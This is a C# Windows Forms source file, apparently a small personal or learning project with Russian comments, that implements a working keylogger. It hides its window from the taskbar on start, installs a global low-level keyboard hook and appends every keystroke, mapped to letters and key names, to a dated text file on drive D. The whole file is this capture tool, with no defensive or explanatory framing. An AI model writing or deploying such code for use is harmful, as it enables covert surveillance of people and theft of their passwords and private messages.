using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp4
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Load += Form1_Load;
            FormClosing += Form1_FormClosing;
            notifyIcon1.Icon = SystemIcons.Application;
            notifyIcon1.DoubleClick += NotifyIcon1_DoubleClick;
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        // подключение библиотек
        // установка хука
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callBack, IntPtr hinstance, uint threadId);

        //функция для снятия пользовательского хука
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);
        //передача сообщения для цепочки 
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);
        //Функция для загрузки библиотек
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        //Номер глобального LowLewel-хука на клавиатуру
        const int WH_KEYBOARD_LL = 13;
        //Сообщение нажатия на клавишу
        const int WM_KEYDOWN = 0x100;
        //Создаем callback делегат
        private LowLevelKeyboardProc _proc = hookProc;
        //Создаем hook и пресваеваем ему значение 0
        private static IntPtr hhook = IntPtr.Zero;
        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            //обработка нажатия 
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";
                string fileName = $"D:\\some_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) { };
                }
                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    //http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes
                    //Раскладкой великобритании

                    switch (vkCode.ToString())
                    {
                        case "8":
                            sw.Write(" backspace ");
                            break;
                        case "9":
                            sw.Write(" tab ");
                            break;
                        case "13":
                            sw.Write(" enter ");
                            break;
                        case "16":
                            sw.Write(" shift ");
                            break;
                        case "17":
                            sw.Write(" ctrl ");
                            break;
                        case "18":
                            sw.Write(" alt ");
                            break;
                        case "19":
                            sw.Write(" pause/break ");
                            break;
                        case "20":
                            sw.Write(" caps_lock ");
                            break;
                        case "27":
                            sw.Write(" escape ");
                            break;
                        case "33":
                            sw.Write(" page_up ");
                            break;
                        case "34":
                            sw.Write(" page_down ");
                            break;
                        case "35":
                            sw.Write(" end ");
                            break;
                        case "36":
                            sw.Write(" home ");
                            break;
                        case "37":
                            sw.Write(" left_arrow ");
                            break;
                        case "38":
                            sw.Write(" up_arrow ");
                            break;
                        case "39":
                            sw.Write(" right_arrow ");
                            break;
                        case "40":
                            sw.Write(" down_arrow ");
                            break;
                        case "45":
                            sw.Write(" insert ");
                            break;
                        case "46":
                            sw.Write(" delete ");
                            break;
                        case "48":
                            sw.Write("0");
                            break;
                        case "49":
                            sw.Write("1");
                            break;
                        case "50":
                            sw.Write("2");
                            break;
                        case "51":
                            sw.Write("3");
                            break;
                        case "52":
                            sw.Write("4");
                            break;
                        case "53":
                            sw.Write("5");
                            break;
                        case "54":
                            sw.Write("6");
                            break;
                        case "55":
                            sw.Write("7");
                            break;
                        case "56":
                            sw.Write("8");
                            break;
                        case "57":
                            sw.Write("9");
                            break;
                        case "65":
                            sw.Write("a");
                            break;
                        case "66":
                            sw.Write("b");
                            break;
                        case "67":
                            sw.Write("c");
                            break;
                        case "68":
                            sw.Write("d");
                            break;
                        case "69":
                            sw.Write("e");
                            break;
                        case "70":
                            sw.Write("f");
                            break;
                        case "71":
                            sw.Write("g");
                            break;
                        case "72":
                            sw.Write("h");
                            break;
                        case "73":
                            sw.Write("i");
                            break;
                        case "74":
                            sw.Write("j");
                            break;
                        case "75":
                            sw.Write("k");
                            break;
                        case "76":
                            sw.Write("l");
                            break;
                        case "77":
                            sw.Write("m");
                            break;
                        case "78":
                            sw.Write("n");
                            break;
                        case "79":
                            sw.Write("o");
                            break;
                        case "80":
                            sw.Write("p");
                            break;
                        case "81":
                            sw.Write("q");
                            break;
                        case "82":
                            sw.Write("r");
                            break;
                        case "83":
                            sw.Write("s");
                            break;
                        case "84":
                            sw.Write("t");
                            break;
                        case "85":
                            sw.Write("u");
                            break;
                        case "86":
                            sw.Write("v");
                            break;
                        case "87":
                            sw.Write("w");
                            break;
                        case "88":
                            sw.Write("x");
                            break;
                        case "89":
                            sw.Write("y");
                            break;
                        case "90":
                            sw.Write("z");
                            break;
                        case "91":
                            sw.Write(" left_window_key ");
                            break;
                        case "92":
                            sw.Write(" right_window_key ");
                            break;
                        case "93":
                            sw.Write(" select_key ");
                            break;
                        case "96":
                            sw.Write(" numpad_0 ");
                            break;
                        case "97":
                            sw.Write(" numpad_1 ");
                            break;
                        case "98":
                            sw.Write(" numpad_2 ");
                            break;
                        case "99":
                            sw.Write(" numpad_3 ");
                            break;
                        case "100":
                            sw.Write(" numpad_4 ");
                            break;
                        case "101":
                            sw.Write(" numpad_5 ");
                            break;
                        case "102":
                            sw.Write(" numpad_6 ");
                            break;
                        case "103":
                            sw.Write(" numpad_7 ");
                            break;
                        case "104":
                            sw.Write(" numpad_8 ");
                            break;
                        case "105":
                            sw.Write(" numpad_9 ");
                            break;
                        case "106":
                            sw.Write(" multiply ");
                            break;
                        case "107":
                            sw.Write(" add ");
                            break;
                        case "109":
                            sw.Write(" subtract ");
                            break;
                        case "110":
                            sw.Write(" decimal_point ");
                            break;
                        case "111":
                            sw.Write(" divide ");
                            break;
                        case "112":
                            sw.Write(" f1 ");
                            break;
                        case "113":
                            sw.Write(" f2 ");
                            break;
                        case "114":
                            sw.Write(" f3 ");
                            break;
                        case "115":
                            sw.Write(" f4 ");
                            break;
                        case "116":
                            sw.Write(" f5 ");
                            break;
                        case "117":
                            sw.Write(" f6 ");
                            break;
                        case "118":
                            sw.Write(" f7 ");
                            break;
                        case "119":
                            sw.Write(" f8 ");
                            break;
                        case "120":
                            sw.Write(" f9 ");
                            break;
                        case "121":
                            sw.Write(" f10 ");
                            break;
                        case "122":
                            sw.Write(" f11 ");
                            break;
                        case "123":
                            sw.Write(" f12 ");
                            break;
                        case "144":
                            sw.Write(" num_lock ");
                            break;
                        case "145":
                            sw.Write(" scroll_lock ");
                            break;
                        case "186":
                            sw.Write(" semi_colon ");
                            break;
                        case "187":
                            sw.Write(" equal_sign ");
                            break;
                        case "188":
                            sw.Write(",");
                            break;
                        case "189":
                            sw.Write(" dash ");
                            break;
                        case "190":
                            sw.Write(" period ");
                            break;
                        case "191":
                            sw.Write("/");
                            break;
                        case "192":
                            sw.Write(" grave_accent ");
                            break;
                        case "219":
                            sw.Write("[");
                            break;
                        case "220":
                            sw.Write("\\");
                            break;
                        case "221":
                            sw.Write("]");
                            break;
                        case "222":
                            sw.Write("'");
                            break;
                    }
                    sw.Close();
                }
                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
            ShowInTaskbar = false;
            SetHook();
        }

        private void NotifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            UnHook();
            Close();
        }

        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hinstance, 0);
        }
        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }
    }
}
